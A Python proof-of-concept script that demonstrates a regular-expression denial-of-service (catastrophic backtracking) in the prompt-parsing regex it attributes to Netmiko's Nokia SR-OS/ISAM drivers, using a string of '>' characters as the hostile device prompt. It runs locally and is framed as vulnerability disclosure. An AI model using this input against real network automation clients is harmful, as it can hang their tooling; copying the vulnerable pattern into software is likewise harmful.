#!/usr/bin/env python3
"""Non-destructive PoC for the Netmiko Nokia SR-OS / ISAM prompt ReDoS.

This times the EXACT regex used by netmiko's NokiaSrosSSH.set_base_prompt and
NokiaIsamSSH.set_base_prompt against a device-controllable prompt string. It opens
no network connections and runs no device commands — it only demonstrates the
catastrophic backtracking.

    python3 poc.py            # growth table (exponential)
    python3 poc.py 40         # single run with a 40-char '>' prompt (will appear to hang)

The vulnerable call, verbatim from netmiko 4.8.0:
    re.search(r"\\*?(.*?)(>.*)*#", cur_base_prompt)
where cur_base_prompt is the prompt string returned by the remote device.
"""
import re
import signal
import sys
import time

EVIL = re.compile(r"\*?(.*?)(>.*)*#")   # netmiko/nokia/nokia_sros.py:67 & nokia_isam.py:25


def malicious_prompt(n: int) -> str:
    # A base prompt a hostile/compromised device could emit: many '>' and no '#'.
    return ">" * n


class _Timeout(Exception):
    pass


def _guard(seconds: float) -> None:
    signal.signal(signal.SIGALRM, lambda *_: (_ for _ in ()).throw(_Timeout()))
    signal.setitimer(signal.ITIMER_REAL, seconds)


def timed(n: int, limit: float = 10.0):
    s = malicious_prompt(n)
    _guard(limit)
    try:
        t0 = time.perf_counter()
        EVIL.search(s)                 # exactly what set_base_prompt does
        dt = time.perf_counter() - t0
        signal.setitimer(signal.ITIMER_REAL, 0)
        return dt
    except _Timeout:
        signal.setitimer(signal.ITIMER_REAL, 0)
        return None


def main() -> None:
    if len(sys.argv) > 1:
        n = int(sys.argv[1])
        dt = timed(n, limit=30.0)
        print(f"n={n}: {'>30s (DoS)' if dt is None else f'{dt:.4f}s'}")
        return
    print("Netmiko Nokia prompt ReDoS — re.search time vs. number of '>' chars")
    for n in range(16, 40, 2):
        dt = timed(n)
        if dt is None:
            print(f"  n={n:3d}  >10s  -> denial of service (aborted)")
            break
        print(f"  n={n:3d}  {dt:9.4f}s")


if __name__ == "__main__":
    main()
